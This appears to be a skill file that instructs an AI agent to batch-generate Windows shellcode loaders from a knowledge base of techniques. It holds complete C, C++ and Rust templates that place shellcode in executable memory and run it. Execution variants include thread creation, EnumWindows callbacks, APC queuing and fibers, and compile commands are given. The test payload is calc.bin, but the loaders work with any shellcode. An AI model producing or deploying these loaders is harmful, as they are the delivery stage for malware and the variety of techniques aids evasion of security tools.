---
name: loader_generate
description: This skill triggers when user wants to "generate loader", "create shellcode loader", "build loader", "批量生成", or create loaders from knowledge base.
version: 1.0.0
---

# Loader Generate Skill

Generate shellcode loaders by combining components from the loader knowledge base.

## Supported Languages

- **C** - Default, compiled with MinGW
- **C++** - For OOP-based loaders
- **Rust** - For memory-safe loaders

## Workflow

### Step 1: Query Components

```bash
# Get all components
python lib/knowledge_manager.py get-components

# Get specific type
python lib/knowledge_manager.py get-components --type executors
```

### Step 2: Check Duplicates

```bash
# List existing scenarios
python lib/knowledge_manager.py list-scenarios
```

### Step 3: Get Random Combination

```bash
# Random combination
python lib/knowledge_manager.py random-combination

# Filter by complexity
python lib/knowledge_manager.py random-combination --complexity simple
```

### Step 4: Generate Code

Load `samples/calc.bin` and generate code in selected language.

#### C Template

```c
#include <windows.h>

unsigned char shellcode[] = { /* calc.bin bytes */ };

int main() {
    LPVOID addr = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(addr, shellcode, sizeof(shellcode));
    ((void(*)())addr)();
    return 0;
}
```

#### C++ Template

```cpp
#include <windows.h>
#include <vector>

class Loader {
public:
    bool execute(const std::vector<uint8_t>& shellcode) {
        LPVOID addr = VirtualAlloc(NULL, shellcode.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!addr) return false;
        memcpy(addr, shellcode.data(), shellcode.size());
        ((void(*)())addr)();
        return true;
    }
};

int main() {
    std::vector<uint8_t> shellcode = { /* calc.bin bytes */ };
    Loader loader;
    loader.execute(shellcode);
    return 0;
}
```

#### Rust Template

```rust
use windows::Win32::System::Memory::*;

fn main() {
    let shellcode: Vec<u8> = vec![/* calc.bin bytes */];

    unsafe {
        let addr = VirtualAlloc(
            None,
            shellcode.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        );

        std::ptr::copy_nonoverlapping(
            shellcode.as_ptr(),
            addr as *mut u8,
            shellcode.len(),
        );

        let func: extern "C" fn() = std::mem::transmute(addr);
        func();
    }
}
```

### Step 5: Compile

```bash
# C
x86_64-w64-mingw32-gcc -o output/loader.exe output/loader.c

# C++
x86_64-w64-mingw32-g++ -o output/loader.exe output/loader.cpp

# Rust
cargo build --release --target x86_64-pc-windows-gnu
```

### Step 6: Test

```bash
./output/loader.exe
tasklist | findstr calc.exe
taskkill /F /IM calc.exe
```

### Step 7: Record

```bash
python lib/knowledge_manager.py add-scenario \
  --name "Loader Name" \
  --storage embedded \
  --allocator VirtualAlloc \
  --copier memcpy \
  --executor callback \
  --status validated

python lib/knowledge_manager.py add-loader-technique \
  --storage embedded \
  --allocator VirtualAlloc \
  --copier memcpy \
  --executor callback
```

## Component Templates (C/C++)

### Allocators

```c
// VirtualAlloc
LPVOID addr = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

// HeapCreate
HANDLE heap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);
LPVOID addr = HeapAlloc(heap, HEAP_ZERO_MEMORY, size);

// NtAllocateVirtualMemory
NtAllocateVirtualMemory(GetCurrentProcess(), &addr, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
```

### Executors

```c
// function_pointer
((void(*)())addr)();

// CreateThread
CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)addr, NULL, 0, NULL);

// callback (EnumWindows)
EnumWindows((WNDENUMPROC)addr, NULL);

// callback (EnumChildWindows)
EnumChildWindows(GetDesktopWindow(), (WNDENUMPROC)addr, NULL);

// APC
QueueUserAPC((PAPCFUNC)addr, GetCurrentThread(), 0);
SleepEx(0, TRUE);

// Fiber
ConvertThreadToFiber(NULL);
LPVOID fiber = CreateFiber(0, (LPFIBER_START_ROUTINE)addr, NULL);
SwitchToFiber(fiber);
```

## Important Rules

1. ALWAYS check `scenarios.json` before generating
2. ALWAYS use `samples/calc.bin` only
3. ALWAYS verify calc.exe execution
4. ALWAYS record results
